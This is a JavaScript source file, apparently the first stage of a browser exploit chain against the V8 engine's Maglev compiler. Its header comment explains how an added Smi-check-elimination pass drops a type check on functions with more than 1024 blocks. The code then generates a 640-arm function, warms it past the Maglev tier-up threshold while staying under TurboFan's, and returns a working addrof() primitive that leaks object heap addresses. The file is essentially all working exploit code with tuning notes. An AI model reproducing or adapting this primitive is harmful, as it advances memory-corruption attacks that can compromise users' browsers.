/* =====================================================================
 * sce.js -- stage 1a: addrof() from maglev-smi-check-elimination.
 *
 * THE BUG
 * src/maglev/maglev-smi-check-elimination.cc, added by the patch:
 *
 *   CollectGuardedIndices()  walks EVERY block of the graph and, for each
 *     CheckInt32Condition(kUnsignedLessThan, DeoptimizeReason::kOutOfBounds),
 *     inserts check->input(0) into guarded_.
 *   NarrowGuardedUntags()    then does, for each collected node that is a
 *     CheckedSmiUntag or CheckedObjectToIndex,
 *         index->OverwriteWith<UnsafeSmiUntag>();
 *
 * The justification is "this index is already bounds-checked, so the Smi
 * check on the conversion is redundant".  It is backwards twice over:
 *   - the bounds check consumes the RESULT of the conversion, so it never
 *     validates the conversion's INPUT; and
 *   - the rewrite is a placement-new over the DEFINITION, while the pass
 *     looked at exactly ONE use.  Every other use of that SSA value, and
 *     every execution on which the bounds-checked path is not taken, now
 *     runs with no Smi check at all.
 *
 * Both added passes are gated on
 *     if (graph_->num_blocks() <= 1024) return;         // kSmallFunctionMaxBlocks
 * which is why nine thousand test cases stayed green: none of them builds a
 * function with more than 1024 Maglev basic blocks.
 *
 * THE SHAPE
 *   t = x + 1                    binop feedback kSignedSmall => CheckedSmiUntag(x)
 *   if (sel === 7) arr[x] = 1;   emits CheckInt32Condition(idx <u len,
 *                                kOutOfBounds) whose input(0) IS that untag,
 *                                so the untag lands in guarded_ ...
 *                                on a branch we never take at trigger time
 *   return t + q
 * After the pass, x is untagged with sarl(value,1) and no check, so passing a
 * HeapObject yields compressed_address >> 1 with no deopt and no side effect.
 *
 *     addrof(o) = (big(o, arr, 0) - 1) * 2
 *
 * MEASUREMENTS on the shipped binary, bot flags only, no natives syntax:
 *   - fires at >= 550 arms, silent at <= 500 (this arm shape is ~2 blocks
 *     per arm, so the 1024-block gate lands around 512 arms)
 *   - 640 arms is ~8.5 KB of bytecode: far under TurboFan's 60 KB tiering
 *     cut-off, and Maglev compiles it in ~16 ms
 *   - deterministic: the same address comes back on every run
 *
 * INVOCATION BUDGET (this is a correctness requirement, not a nicety)
 *   invocation_count_for_maglev = 400, invocation_count_for_turbofan = 3000.
 *   Maglev cancels a finished job if TurboFan is already the active tier
 *   (compiler.cc ActiveTierIsTurbofan check), and the stack guard runs
 *   INSTALL_CODE before INSTALL_MAGLEV_CODE, so once TurboFan lands the
 *   Maglev code is thrown away and the bug disappears.  We therefore stay
 *   under 3000 invocations per victim and re-arm with a fresh function.
 * ===================================================================== */
(function () {
  "use strict";

  function log(m) { try { if (window.XLOG) window.XLOG(m); } catch (e) {} }

  var ARMS       = 640;    // > the ~512-arm gate, with margin
  var WARM       = 1200;   // > invocation_count_for_maglev (400)
  var IDLE_MS    = 1500;   // let the concurrent job finalise and install
  var NUDGE      = 400;    // calls that let the stack guard install the code
  var BUDGET     = 2600;   // hard stop well before invocation_count_for_turbofan

  function build(arms) {
    var s = "return function big(x, arr, sel){\n var t = x + 1;\n var q = 0;\n";
    for (var i = 0; i < arms; i++)
      s += " if (sel === " + (100000 + i) + ") { q += " + i + "; }\n";
    s += " if (sel === 7) { arr[x] = 1; }\n";
    s += " return t + q;\n}";
    return Function(s)();
  }

  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  // Arming is async because the Maglev job is compiled on a background thread
  // and installed from the stack guard; we have to give the event loop a turn.
  async function arm(maxAttempts) {
    for (var attempt = 0; attempt < (maxAttempts || 6); attempt++) {
      var big = build(ARMS);
      var arr = [1, 2, 3, 4, 5, 6, 7, 8];
      var calls = 0;
      var i;
      for (i = 0; i < WARM; i++) { big(3, arr, 7); calls++; }
      await sleep(IDLE_MS);
      for (i = 0; i < NUDGE / 2; i++) { big(3, arr, 7); calls++; }
      await sleep(60);
      for (i = 0; i < NUDGE / 2; i++) { big(3, arr, 7); calls++; }

      var probeObj = {};
      var r = big(probeObj, arr, 0); calls++;
      if (typeof r === "number" && isFinite(r) && r > 0x1000) {
        var addr = ((r - 1) * 2) >>> 0;
        log("sce: armed on attempt " + attempt + " after " + calls +
            " invocations; addrof(probe) = 0x" + addr.toString(16));
        var state = { calls: calls };
        return function addrof(o) {
          if (state.calls >= BUDGET)
            throw new Error("sce: invocation budget exhausted; re-arm needed");
          var v = big(o, arr, 0);
          state.calls++;
          if (typeof v !== "number")
            throw new Error("sce: optimised code was replaced (got " + (typeof v) + ")");
          return ((v - 1) * 2) >>> 0;
        };
      }
      // The probe poisoned this function's binop feedback, so it can never be
      // recompiled with a CheckedSmiUntag.  Throw it away and build a new one.
      log("sce: attempt " + attempt + " did not fire (" + (typeof r) + " " +
          String(r).slice(0, 20) + "); rebuilding");
    }
    throw new Error("sce: could not arm addrof");
  }

  window.SCE = { arm: arm, build: build, ARMS: ARMS };
})();
